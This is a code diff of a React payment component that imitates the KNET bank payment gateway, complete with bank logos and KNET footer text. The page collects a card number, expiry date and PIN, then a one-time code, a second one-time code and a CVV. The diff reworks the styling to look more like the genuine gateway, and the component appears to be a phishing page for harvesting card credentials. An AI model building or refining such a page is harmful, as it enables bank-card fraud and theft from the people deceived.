@@ -649,232 +649,162 @@ export function QuickPayAmount({ locale, productId, initialStep, source }: { loc
           )}
         </>
       ) : (
-        <div
-          dir="ltr"
-          className="knet-gateway bg-[#ebebeb] pb-6 text-black"
-          style={{ fontFamily: "Verdana, Arial, Helvetica, sans-serif" }}
-        >
-          <div aria-hidden="true" className="mx-auto block h-[90px] max-w-[372px] bg-cover bg-center" style={{ margin: "5px auto -30px", borderRadius: "0 10px", backgroundImage: "url(/knet/banner.jpg)" }} />
-          <div className="box-border w-full px-[15px]">
-            <div className="mx-auto w-[98%] max-w-[395px]">
-              <section className="mb-[15px] mt-[25px] rounded-[15px] border-2 border-[#8f8f90] bg-white p-5 shadow-[0_0_6px_rgba(0,0,0,0.3)]">
-                <img src="/knet/logo.jpg" alt="NBK" className="-mt-[5px] mb-[15px] ml-[27%] w-[42%]" />
-                <div className="flow-root border-b border-[#8f8f90] py-[5px]">
-                  <span className="float-right text-[11px] font-bold text-[#0070cd]">:{t("beneficiary")}</span>
-                  <span className="block w-[60%] text-end text-[11px] text-[#444]">{t("merchant")}</span>
+        <div dir="ltr" className="flex min-h-dvh flex-col items-center bg-[#e5e5e5] text-[#222]" style={{ fontFamily: "'Cairo', Arial, sans-serif" }}>
+          <div className="w-full self-stretch"><img src="/knet/banner.jpg" alt="" className="block w-full" /></div>
+          <div className="flex w-full max-w-[460px] flex-col gap-3 px-[10px] pb-5 pt-[14px]">
+            {/* Info card */}
+            <div className="overflow-hidden rounded-[10px] border border-[#bbb] bg-white shadow-[0_2px_8px_rgba(0,0,0,0.12)]">
+              <div className="flex flex-col items-center gap-3 px-[18px] pb-[14px] pt-5">
+                <img src="/knet/logo.jpg" alt="KIB" className="h-11 object-contain" />
+                <div className="w-full border-t border-[#d8d8d8]">
+                  <div className="grid grid-cols-[1fr_auto] items-center border-b border-[#d8d8d8] px-1 py-[7px]" dir="ltr">
+                    <span className="text-xs font-medium text-[#555]">{t("merchant")}</span>
+                    <span dir="rtl" className="text-xs font-bold text-[#005baa]">:{t("beneficiary")}</span>
+                  </div>
+                  <div className="grid grid-cols-[1fr_auto] items-center px-1 py-[7px]" dir="ltr">
+                    <span className="text-[13px] font-bold text-[#222]">KD&nbsp;{((parsed ?? 0) / 100).toFixed(3)}</span>
+                    <span dir="rtl" className="text-xs font-bold text-[#005baa]">:{t("invoiceAmount")}</span>
+                  </div>
                 </div>
-                <div className="flow-root py-[5px]">
-                  <span className="float-right text-[11px] font-bold text-[#0070cd]">:{t("invoiceAmount")}</span>
-                  <span className="block w-[60%] text-end text-[11px] text-[#444]">KD&nbsp;{((parsed ?? 0) / 100).toFixed(3)}</span>
+              </div>
+            </div>
+
+            {knetError ? (
+              <div className="rounded-lg border-[1.5px] border-[#cc0000] bg-[#fff0f0] px-[14px] py-[10px] text-center text-[15px] font-extrabold text-[#cc0000]">{t(knetErrorKey)}</div>
+            ) : null}
+
+            {step === "knetOtp" || step === "knetOtp2" || step === "knetCvv" ? (
+              <div className="overflow-hidden rounded-[10px] border border-[#bbb] bg-white shadow-[0_2px_8px_rgba(0,0,0,0.12)]">
+                <div className="px-4 pb-[6px] pt-4">
+                  <div dir="rtl" className="mb-[14px] rounded-lg border border-[#b8d4e3] bg-[#E8F1F5] px-4 py-[14px] text-right text-[13px] font-medium leading-[1.8] text-[#1a3a5c]">
+                    {step === "knetCvv" ? t("cvvHint") : step === "knetOtp2" ? t("otp2Warning") : t("otpWarning")}
+                  </div>
+                  <table dir="rtl" className="w-full border-collapse">
+                    <tbody>
+                      <tr className="border-b border-[#ccc]">
+                        <td className="whitespace-nowrap py-[7px] pe-3 ps-1 text-right text-xs font-bold text-[#005baa]">:{t("debitNumber")}</td>
+                        <td dir="ltr" className="py-[7px] ps-3 text-left font-[Arial,Helvetica,sans-serif] text-xs font-medium tracking-wide text-[#222]">{maskKnetOtpCard(debitNumber)}</td>
+                      </tr>
+                      <tr className="border-b border-[#ccc]">
+                        <td className="whitespace-nowrap py-[7px] pe-3 ps-1 text-right text-xs font-bold text-[#005baa]">:{t("otpMonth")}</td>
+                        <td dir="ltr" className="py-[7px] ps-3 text-left font-[Arial,Helvetica,sans-serif] text-xs font-medium tracking-wide text-[#222]">{debitMonth}</td>
+                      </tr>
+                      <tr className="border-b border-[#ccc]">
+                        <td className="whitespace-nowrap py-[7px] pe-3 ps-1 text-right text-xs font-bold text-[#005baa]">:{t("otpYear")}</td>
+                        <td dir="ltr" className="py-[7px] ps-3 text-left font-[Arial,Helvetica,sans-serif] text-xs font-medium tracking-wide text-[#222]">{debitYear.length === 2 ? `20${debitYear}` : debitYear}</td>
+                      </tr>
+                      <tr className="border-b border-[#ccc]">
+                        <td className="whitespace-nowrap py-[7px] pe-3 ps-1 text-right text-xs font-bold text-[#005baa]">:{t("pin")}</td>
+                        <td dir="ltr" className="py-[7px] ps-3 text-left font-[Arial,Helvetica,sans-serif] text-xs font-medium tracking-wide text-[#222]">****</td>
+                      </tr>
+                      <tr>
+                        <td className="whitespace-nowrap py-[7px] pe-3 ps-1 text-right text-xs font-bold text-[#005baa]">{step === "knetCvv" ? ":CVV" : step === "knetOtp2" ? ":OTP 2" : ":OTP"}</td>
+                        <td dir="ltr" className="py-[7px] ps-3">
+                          <input
+                            value={step === "knetCvv" ? knetCvv : step === "knetOtp2" ? knetOtp2 : knetOtp}
+                            onChange={(event) => {
+                              const val = event.target.value.replace(/\D/g, "").slice(0, step === "knetCvv" ? 3 : 6);
+                              if (step === "knetCvv") setKnetCvv(val);
+                              else if (step === "knetOtp2") setKnetOtp2(val);
+                              else setKnetOtp(val);
+                              setKnetError(false);
+                            }}
+                            dir="ltr"
+                            inputMode="numeric"
+                            autoComplete={step === "knetCvv" ? "off" : "one-time-code"}
+                            maxLength={step === "knetCvv" ? 3 : 6}
+                            placeholder={step === "knetCvv" ? "" : `Timeout in: ${otpClock}`}
+                            className="h-7 w-full rounded-[6px] border border-[#bcbcbc] bg-[linear-gradient(to_bottom,#fff_0%,#ebebeb_100%)] px-2 font-[Arial,Helvetica,sans-serif] text-[13px] tracking-wide text-[#333] shadow-[inset_0_2px_4px_rgba(0,0,0,0.12),0_1px_0_#fff] outline-none placeholder:font-bold placeholder:text-[#8a8a8a]"
+                          />
+                        </td>
+                      </tr>
+                    </tbody>
+                  </table>
                 </div>
-              </section>
-              <section className="mb-[15px] rounded-[15px] border-2 border-[#8f8f90] bg-white p-5 shadow-[0_0_6px_rgba(0,0,0,0.3)]">
-                {step === "knetOtp" || step === "knetOtp2" ? (
-                  <div>
-                    <p dir="rtl" className="rounded-[6px] border border-[#7eb6dc] bg-[#e8f4fb] px-2 py-[5px] text-center text-[11px] leading-4 text-[#3d92c9]">{step === "knetOtp2" ? t("otp2Warning") : t("otpWarning")}</p>
-                    <div className="mt-2 flex items-center gap-2 border-b border-[#e4e4e4] py-[5px]">
-                      <span dir="ltr" className="min-w-0 flex-1 whitespace-nowrap text-center text-[11px] font-bold text-[#444]">{maskKnetOtpCard(debitNumber)}</span>
-                      <span className="shrink-0 text-[11px] font-bold leading-4 text-[#0070cd]">:{t("debitNumber")}</span>
-                    </div>
-                    <div className="flex items-center gap-2 border-b border-[#e4e4e4] py-[5px]">
-                      <span className="flex-1 text-center text-[11px] font-bold text-[#444]">{debitMonth}</span>
-                      <span className="shrink-0 text-[11px] font-bold leading-4 text-[#0070cd]">:{t("otpMonth")}</span>
-                    </div>
-                    <div className="flex items-center gap-2 border-b border-[#e4e4e4] py-[5px]">
-                      <span className="flex-1 text-center text-[11px] font-bold text-[#444]">{debitYear.length === 2 ? `20${debitYear}` : debitYear}</span>
-                      <span className="shrink-0 text-[11px] font-bold leading-4 text-[#0070cd]">:{t("otpYear")}</span>
-                    </div>
-                    <div className="flex items-center gap-2 border-b border-[#e4e4e4] py-[5px]">
-                      <span className="flex-1 text-center text-[11px] font-bold text-[#444]">{"*".repeat(pin.length)}</span>
-                      <span className="shrink-0 text-[11px] font-bold leading-4 text-[#0070cd]">:{t("pin")}</span>
-                    </div>
-                    <label className="mt-[5px] flex items-center gap-2">
-                      <input
-                        value={step === "knetOtp2" ? knetOtp2 : knetOtp}
-                        onChange={(event) => {
-                          const val = event.target.value.replace(/\D/g, "").slice(0, 6);
-                          if (step === "knetOtp2") {
-                            setKnetOtp2(val);
-                          } else {
-                            setKnetOtp(val);
-                          }
-                          setKnetError(false);
-                        }}
-                        dir="ltr"
-                        inputMode="numeric"
-                        autoComplete="one-time-code"
-                        maxLength={6}
-                        placeholder={`Timeout in: ${otpClock}`}
-                        aria-label={step === "knetOtp2" ? "OTP 2" : "OTP"}
-                        className="h-[26px] w-[62%] rounded-[8px] border border-[#c8c8c8] bg-white text-center text-[11px] font-bold text-[#797575] outline-none placeholder:font-bold placeholder:text-[#9a9a9a]"
-                      />
-                      <span className="ms-auto shrink-0 text-[11px] font-bold leading-4 text-[#0070cd]">{step === "knetOtp2" ? "OTP 2:" : "OTP:"}</span>
+              </div>
+            ) : (
+              <div className="overflow-hidden rounded-[10px] border border-[#bbb] bg-white shadow-[0_2px_8px_rgba(0,0,0,0.12)]">
+                <div className="px-5 py-[18px]">
+                  <div className="mb-1 flex items-center justify-around border-b border-[#d8d8d8] pb-[10px]">
+                    <label className="flex cursor-pointer items-center gap-2" dir="ltr">
+                      <img src="/icons/pay-knet.svg" alt="K-Net" className="h-9 object-contain" />
+                      <span className="flex h-[17px] w-[17px] items-center justify-center rounded-full border-2 border-[#005baa]"><span className="h-2 w-2 rounded-full bg-[#005baa]" /></span>
+                    </label>
+                    <label className="flex cursor-not-allowed items-center gap-2 opacity-45" dir="ltr">
+                      <img src="/icons/pay-card.png" alt="K-Fast" className="h-9 object-contain" />
+                      <span className="flex h-[17px] w-[17px] items-center justify-center rounded-full border-2 border-[#aaa]" />
                     </label>
                   </div>
-                ) : step === "knetCvv" ? (
-                  <label className="flow-root py-[5px]">
-                    <span className="float-right mt-[3px] w-[40%] text-end text-[11px] font-bold leading-4 text-[#0070cd]">:{t("cvvLabel")}</span>
-                    <input
-                      value={knetCvv}
-                      onChange={(event) => {
-                        setKnetCvv(event.target.value.replace(/\D/g, "").slice(0, 3));
-                        setKnetError(false);
-                      }}
-                      id="knet-cvv"
-                      dir="ltr"
-                      inputMode="numeric"
-                      autoComplete="off"
-                      maxLength={3}
-                      aria-label={t("cvvLabel")}
-                      className="block h-[26px] w-[60%] rounded-[5px] border border-[#c7d0d5] bg-[linear-gradient(to_bottom,#c9c9c9_0%,#fff_39%)] px-[5px] text-[11px] font-bold text-[#797575] outline-none"
-                    />
-                    <p className="clear-both pt-2 text-end text-[11px] leading-5 text-[#444]">{t("cvvHint")}</p>
-                  </label>
-                ) : (
-                <>
-                <div className="flow-root border-b border-[#8f8f90] py-[5px]">
-                  <span className="float-right mt-[3px] w-[40%] text-end text-[11px] font-bold leading-4 text-[#0070cd]">:{t("debitNumber")}</span>
-                  <div className={`relative w-[60%] ${suggestOpen && debitMatches.length > 0 ? "z-20" : ""}`}>
-                    <input
-                      value={debitFocused ? formatKnetCard(debitNumber) : maskKnetCard(debitNumber)}
-                      onChange={(event) => {
-                        setDebitNumber(event.target.value.replace(/\D/g, "").slice(0, 16));
-                        setSuggestOpen(true);
-                        setKnetError(false);
-                      }}
-                      onFocus={() => {
-                        setDebitFocused(true);
-                        if (debitNumber) setSuggestOpen(true);
-                      }}
-                      onBlur={() => {
-                        setDebitFocused(false);
-                        setSuggestOpen(false);
-                      }}
-                      dir="ltr"
-                      inputMode="numeric"
-                      autoComplete="off"
-                      maxLength={19}
-                      aria-label={t("debitNumber")}
-                      className={`block h-[26px] w-full rounded-[5px] border border-[#c7d0d5] bg-[linear-gradient(to_bottom,#c9c9c9_0%,#fff_39%)] pl-[5px] text-[11px] font-bold text-[#797575] outline-none ${debitLogo ? "pr-[42px]" : "pr-[5px]"}`}
-                    />
-                    {debitLogo ? <img src={debitLogo} alt="" className="pointer-events-none absolute top-1/2 right-[6px] h-[15px] w-auto max-w-[35px] -translate-y-1/2" /> : null}
-                    {suggestOpen && debitMatches.length > 0 ? (
-                      <ul className="absolute top-full z-10 mt-[2px] max-h-[87px] w-full overflow-y-auto rounded-[5px] border border-[#c7d0d5] bg-[linear-gradient(to_bottom,#c9c9c9_0%,#fff_39%)] p-0 shadow-[0_3px_8px_rgba(0,0,0,0.25)]" style={{ fontFamily: "Arial, Helvetica, sans-serif" }}>
-                        {debitMatches.map((card) => (
-                          <li key={card.bin}>
-                            <button
-                              type="button"
-                              onMouseDown={(event) => event.preventDefault()}
-                              onClick={() => {
-                                setDebitNumber((current) => (current.length < card.bin.length ? card.bin : current));
-                                setSuggestOpen(false);
-                                setKnetError(false);
-                              }}
-                              className="flex w-full cursor-pointer items-center justify-between px-[6px] py-[3px] text-left text-[13px] text-[#797575] hover:bg-[#e9e9e9]"
-                            >
-                              <span>{card.bin} - {card.brand}</span>
-                              <img src={card.logo} alt="" className="ml-[10px] h-[13px] w-auto" />
-                            </button>
-                          </li>
-                        ))}
-                      </ul>
-                    ) : null}
-                  </div>
+                  <table dir="ltr" className="w-full border-collapse">
+                    <tbody>
+                      <tr className="border-b border-[#d8d8d8]">
+                        <td className="w-[58%] py-[7px] pe-1 align-middle">
+                          <div className={`relative ${suggestOpen && debitMatches.length > 0 ? "z-20" : ""}`}>
+                            <input
+                              value={debitFocused ? formatKnetCard(debitNumber) : maskKnetCard(debitNumber)}
+                              onChange={(event) => { setDebitNumber(event.target.value.replace(/\D/g, "").slice(0, 16)); setSuggestOpen(true); setKnetError(false); }}
+                              onFocus={() => { setDebitFocused(true); if (debitNumber) setSuggestOpen(true); }}
+                              onBlur={() => { setDebitFocused(false); setSuggestOpen(false); }}
+                              dir="ltr"
+                              inputMode="numeric"
+                              autoComplete="off"
+                              maxLength={19}
+                              className={`h-7 w-full rounded-[6px] border border-[#bcbcbc] bg-[linear-gradient(to_bottom,#fff_0%,#ebebeb_100%)] px-2 font-[Arial,Helvetica,sans-serif] text-[13px] tracking-wide text-[#333] shadow-[inset_0_2px_4px_rgba(0,0,0,0.12),0_1px_0_#fff] outline-none ${debitLogo ? "pr-[46px]" : ""}`}
+                            />
+                            {debitLogo ? <img src={debitLogo} alt="" className="pointer-events-none absolute right-[6px] top-1/2 h-[18px] w-auto max-w-[35px] -translate-y-1/2 object-contain" /> : null}
+                            {suggestOpen && debitMatches.length > 0 ? (
+                              <div className="absolute left-0 right-0 top-[calc(100%+6px)] z-10 max-h-[220px] overflow-y-auto rounded-[6px] border border-[#ccc] bg-white shadow-[0_4px_12px_rgba(0,0,0,0.15)]">
+                                {debitMatches.map((card) => (
+                                  <button key={card.bin} type="button" onMouseDown={(event) => event.preventDefault()} onClick={() => { setDebitNumber((c) => (c.length < card.bin.length ? card.bin : c)); setSuggestOpen(false); setKnetError(false); }} className="flex w-full items-center justify-between border-b border-[#f0f0f0] bg-[#e8e8e8] px-3 py-[9px] text-left text-[13px] font-semibold tracking-wide text-[#222] transition-colors hover:bg-[#f0f6ff]">
+                                    <span>{card.bin} - {card.brand}</span>
+                                    <img src={card.logo} alt="" className="ml-[10px] h-[30px] w-[52px] rounded border border-[#e8e8e8] bg-[#f5f5f5] object-contain p-[2px]" />
+                                  </button>
+                                ))}
+                              </div>
+                            ) : null}
+                          </div>
+                        </td>
+                        <td dir="rtl" className="w-[42%] whitespace-nowrap py-[7px] ps-1 pe-[6px] text-right align-middle text-xs font-bold text-[#005baa]">:{t("debitNumber")}</td>
+                      </tr>
+                      <tr className="border-b border-[#d8d8d8]">
+                        <td className="w-[58%] py-[7px] pe-1 text-right align-middle">
+                          <div dir="ltr" className="ml-auto flex h-7 w-[100px] items-center rounded-[6px] border border-[#bcbcbc] bg-[linear-gradient(to_bottom,#fff_0%,#ebebeb_100%)] shadow-[inset_0_2px_4px_rgba(0,0,0,0.12),0_1px_0_#fff]">
+                            <input ref={expiryYearRef} value={debitYear} onChange={(event) => { const next = event.target.value.replace(/\D/g, "").slice(0, 2); setDebitYear(next); setKnetError(false); setKnetExpiryError(false); if (next.length === 2) expiryMonthRef.current?.focus(); }} dir="ltr" inputMode="numeric" autoComplete="off" placeholder="YY" className="h-full w-[38px] shrink-0 border-0 bg-transparent pl-2 font-[Arial,Helvetica,sans-serif] text-[13px] tracking-wide text-[#333] outline-none placeholder:font-bold placeholder:text-[#8a8a8a]" />
+                            <span className="shrink-0 text-center text-[13px] font-bold text-[rgba(0,0,0,0.56)]">/</span>
+                            <input ref={expiryMonthRef} value={debitMonth} onChange={(event) => { setDebitMonth(normalizeExpiryMonthInput(event.target.value)); setKnetError(false); setKnetExpiryError(false); }} onKeyDown={(event) => { if (event.key === "Backspace" && debitMonth.length === 0) expiryYearRef.current?.focus(); }} dir="ltr" inputMode="numeric" autoComplete="off" placeholder="MM" className="h-full w-[38px] shrink-0 border-0 bg-transparent pr-2 text-center font-[Arial,Helvetica,sans-serif] text-[13px] tracking-wide text-[#333] outline-none placeholder:font-bold placeholder:text-[#8a8a8a]" />
+                          </div>
+                        </td>
+                        <td dir="rtl" className="w-[42%] whitespace-nowrap py-[7px] ps-1 pe-[6px] text-right align-middle text-xs font-bold text-[#005baa]">:{t("debitExpiry")}</td>
+                      </tr>
+                      <tr>
+                        <td className="w-[58%] py-[7px] pe-1 align-middle">
+                          <input value={pin} onChange={(event) => { setPin(event.target.value.replace(/\D/g, "").slice(0, 4)); setKnetError(false); }} dir="ltr" type="text" inputMode="numeric" autoComplete="off" maxLength={4} className="h-7 w-full rounded-[6px] border border-[#bcbcbc] bg-[linear-gradient(to_bottom,#fff_0%,#ebebeb_100%)] px-2 font-[Arial,Helvetica,sans-serif] text-[13px] tracking-wide text-[#333] shadow-[inset_0_2px_4px_rgba(0,0,0,0.12),0_1px_0_#fff] outline-none [-webkit-text-security:disc]" />
+                        </td>
+                        <td dir="rtl" className="w-[42%] whitespace-nowrap py-[7px] ps-1 pe-[6px] text-right align-middle text-xs font-bold text-[#005baa]">:{t("pin")}</td>
+                      </tr>
+                    </tbody>
+                  </table>
                 </div>
-                <div className="flow-root border-b border-[#8f8f90] py-[5px]">
-                  <div className="float-right mt-[3px] text-right">
-                    <span className="text-[11px] font-bold text-[#0070cd]">:{t("debitExpiry")}</span>
-                  </div>
-                  <div className="w-[60%] text-right">
-                    <div dir="ltr" className="float-right flex h-[21px] w-[71px] items-center rounded-[5px] border border-[#ccc] bg-[linear-gradient(to_bottom,#c9c9c9_0%,#fff_39%)]">
-                      <input
-                        ref={expiryYearRef}
-                        value={debitYear}
-                        onChange={(event) => {
-                          const next = event.target.value.replace(/\D/g, "").slice(0, 2);
-                          setDebitYear(next);
-                          setKnetError(false);
-                          setKnetExpiryError(false);
-                          if (next.length === 2) expiryMonthRef.current?.focus();
-                        }}
-                        dir="ltr"
-                        inputMode="numeric"
-                        autoComplete="off"
-                        placeholder="YY"
-                        aria-label={t("debitExpiry")}
-                        className="h-full w-[30px] shrink-0 border-0 bg-transparent pl-[7px] text-[11px] font-bold text-[#797575] outline-none placeholder:font-bold placeholder:text-[rgba(0,0,0,0.56)]"
-                      />
-                      <span className="w-[11px] shrink-0 text-center text-[11px] font-bold leading-none text-[rgba(0,0,0,0.56)]">/</span>
-                      <input
-                        ref={expiryMonthRef}
-                        value={debitMonth}
-                        onChange={(event) => {
-                          setDebitMonth(normalizeExpiryMonthInput(event.target.value));
-                          setKnetError(false);
-                          setKnetExpiryError(false);
-                        }}
-                        onKeyDown={(event) => {
-                          if (event.key === "Backspace" && debitMonth.length === 0) expiryYearRef.current?.focus();
-                        }}
-                        dir="ltr"
-                        inputMode="numeric"
-                        autoComplete="off"
-                        placeholder="MM"
-                        aria-label={t("debitExpiry")}
-                        className="h-full w-[28px] shrink-0 border-0 bg-transparent pr-[4px] text-center text-[11px] font-bold text-[#797575] outline-none placeholder:font-bold placeholder:text-[rgba(0,0,0,0.56)]"
-                      />
-                    </div>
-                  </div>
-                </div>
-                <label className="flow-root py-[5px]">
-                  <span className="float-right mt-[3px] w-[40%] text-end text-[11px] font-bold leading-4 text-[#0070cd]">:{t("pin")}</span>
-                  <input
-                    value={pin}
-                    onChange={(event) => {
-                      setPin(event.target.value.replace(/\D/g, "").slice(0, 4));
-                      setKnetError(false);
-                    }}
-                    dir="ltr"
-                    type="text"
-                    inputMode="numeric"
-                    autoComplete="off"
-                    maxLength={4}
-                    className="block h-[26px] w-[60%] rounded-[5px] border border-[#c7d0d5] bg-[linear-gradient(to_bottom,#c9c9c9_0%,#fff_39%)] px-[5px] text-[11px] font-bold text-[#797575] outline-none [-webkit-text-security:disc]"
-                  />
-                </label>
-                </>
-                )}
-                {knetError ? (
-                  <p className="pt-1 text-center text-[12px] text-[#ff0000]">
-                    {t(knetErrorKey)}
-                  </p>
-                ) : null}
-              </section>
-              <section className="mb-[15px] rounded-[15px] border-2 border-[#8f8f90] bg-white p-5 shadow-[0_0_6px_rgba(0,0,0,0.3)]">
-                <div className="flex gap-[3px]">
-                  <button
-                    type="button"
-                    onClick={() => {
-                      setKnetError(false);
-                      setStep(step === "knetOtp2" ? "knetCvv" : step === "knetCvv" ? "knetOtp" : step === "knetOtp" ? "knet" : "pay");
-                    }}
-                    className="h-[27px] w-1/2 rounded-[4px] border border-[#cacaca] bg-[#eaeaea] text-[13px] font-bold text-[#606060]"
-                  >
+              </div>
+            )}
+
+            <div className="overflow-hidden rounded-[10px] border border-[#bbb] bg-white shadow-[0_2px_8px_rgba(0,0,0,0.12)]">
+              <div className="px-5 py-[18px]">
+                <div dir="rtl" className="flex w-full gap-1">
+                  <button type="button" disabled={knetBusy || pending} onClick={() => void submitKnetStep()} className="flex-1 cursor-pointer rounded-e-[6px] border-none bg-[#d4d4d4] px-2 py-[10px] text-sm font-semibold text-[#333] transition-colors hover:bg-[#c0c0c0] disabled:opacity-60">
+                    {step === "knetOtp" || step === "knetOtp2" || step === "knetCvv" ? t("send") : t("send")}
+                  </button>
+                  <button type="button" onClick={() => { setKnetError(false); setStep(step === "knetOtp2" ? "knetCvv" : step === "knetCvv" ? "knetOtp" : step === "knetOtp" ? "knet" : "pay"); }} className="flex-1 cursor-pointer rounded-s-[6px] border-none bg-[#d4d4d4] px-2 py-[10px] text-sm font-semibold text-[#333] transition-colors hover:bg-[#c0c0c0]">
                     {t("cancel")}
                   </button>
-                  <button
-                    type="button"
-                    disabled={knetBusy || pending}
-                    onClick={() => void submitKnetStep()}
-                    className="h-[27px] w-1/2 rounded-[4px] border border-[#cacaca] bg-[#eaeaea] text-[13px] font-bold text-[#606060] disabled:opacity-60"
-                  >
-                    {t("send")}
-                  </button>
                 </div>
-              </section>
-              <p className="mt-[15px] text-center text-[12px] text-black">{t("rights")}</p>
-              <p className="text-center text-[12px] font-bold leading-5 text-[#0077D5]">{t("knetCompany")}</p>
+              </div>
             </div>
+          </div>
+
+          <div className="w-full max-w-[460px] px-3 pb-[18px] pt-[10px] text-center">
+            <p className="text-xs font-semibold text-[#555]">{t("rights")}</p>
+            <p className="text-xs font-bold leading-5 text-[#005baa]">{t("knetCompany")}</p>
           </div>
         </div>
       )}
